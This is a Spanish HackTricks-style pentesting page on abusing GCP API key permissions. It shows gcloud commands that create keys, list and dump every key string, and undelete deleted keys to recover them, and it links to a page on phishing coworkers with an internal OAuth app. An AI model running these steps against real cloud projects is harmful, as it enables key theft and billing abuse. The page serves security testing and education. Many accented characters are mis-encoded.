# GCP - Escalada de privilegios de Apikeys

{% hint style="success" %}
Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* 隆Consulta los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Apikeys

Los siguientes permisos son 煤tiles para crear y robar claves API, no esto de la documentaci贸n: _Una clave API es una cadena cifrada simple que **identifica una aplicaci贸n sin ning煤n principal**. Son 煤tiles para acceder a **datos p煤blicos de forma an贸nima**, y se utilizan para **asociar** las solicitudes de API con tu proyecto para cuotas y **facturaci贸n**._

Por lo tanto, con una clave API puedes hacer que la empresa pague por tu uso de la API, pero no podr谩s escalar privilegios.

Para obtener m谩s informaci贸n sobre las claves API, consulta:

{% content-ref url="../gcp-services/gcp-api-keys-enum.md" %}
[gcp-api-keys-enum.md](../gcp-services/gcp-api-keys-enum.md)
{% endcontent-ref %}

Para otras formas de crear claves API, consulta:

{% content-ref url="gcp-serviceusage-privesc.md" %}
[gcp-serviceusage-privesc.md](gcp-serviceusage-privesc.md)
{% endcontent-ref %}

### Fuerza bruta para acceder a la clave API <a href="#apikeys.keys.create" id="apikeys.keys.create"></a>

Dado que es posible que no sepas qu茅 APIs est谩n habilitadas en el proyecto o las restricciones aplicadas a la clave API que encontraste, ser铆a interesante ejecutar la herramienta [**https://github.com/ozguralp/gmapsapiscanner**](https://github.com/ozguralp/gmapsapiscanner) y verificar **a qu茅 puedes acceder con la clave API.**

### `apikeys.keys.create` <a href="#apikeys.keys.create" id="apikeys.keys.create"></a>

Este permiso permite **crear una clave API**:
```bash
gcloud services api-keys create
Operation [operations/akmf.p7-[...]9] complete. Result: {
"@type":"type.googleapis.com/google.api.apikeys.v2.Key",
"createTime":"2022-01-26T12:23:06.281029Z",
"etag":"W/\"HOhA[...]==\"",
"keyString":"AIzaSy[...]oU",
"name":"projects/5[...]6/locations/global/keys/f707[...]e8",
"uid":"f707[...]e8",
"updateTime":"2022-01-26T12:23:06.378442Z"
}
```
Puedes encontrar un script para automatizar la [**creaci贸n, explotaci贸n y limpieza de un entorno vulnerable aqu铆**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/b-apikeys.keys.create.sh).

{% hint style="danger" %}
Ten en cuenta que por defecto, los usuarios tienen permisos para crear nuevos proyectos y se les otorga el rol de Propietario sobre el nuevo proyecto. Por lo tanto, un usuario podr铆a **crear un proyecto y una clave API dentro de este proyecto**.
{% endhint %}

### `apikeys.keys.getKeyString`, `apikeys.keys.list` <a href="#apikeys.keys.getkeystringapikeys.keys.list" id="apikeys.keys.getkeystringapikeys.keys.list"></a>

Estos permisos permiten **listar y obtener todas las claves API y obtener la clave**:
```bash
for  key  in  $(gcloud services api-keys list --uri); do
gcloud services api-keys get-key-string "$key"
done
```
Puedes encontrar un script para automatizar la [**creaci贸n, explotaci贸n y limpieza de un entorno vulnerable aqu铆**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/c-apikeys.keys.getKeyString.sh).

### `apikeys.keys.undelete` , `apikeys.keys.list` <a href="#serviceusage.apikeys.regenerateapikeys.keys.list" id="serviceusage.apikeys.regenerateapikeys.keys.list"></a>

Estos permisos te permiten **listar y regenerar claves API eliminadas**. La **clave API se muestra en la salida** despu茅s de que se haya realizado el **undelete**:
```bash
gcloud services api-keys list --show-deleted
gcloud services api-keys undelete <key-uid>
```
### Crear una aplicaci贸n de OAuth interna para pescar a otros trabajadores

Consulte la siguiente p谩gina para aprender c贸mo hacer esto, aunque esta acci贸n pertenece al servicio **`clientauthconfig`** [seg煤n la documentaci贸n](https://cloud.google.com/iap/docs/programmatic-oauth-clients#before-you-begin):

{% content-ref url="../../workspace-security/gws-google-platforms-phishing/" %}
[gws-google-platforms-phishing](../../workspace-security/gws-google-platforms-phishing/)
{% endcontent-ref %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Consulta los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
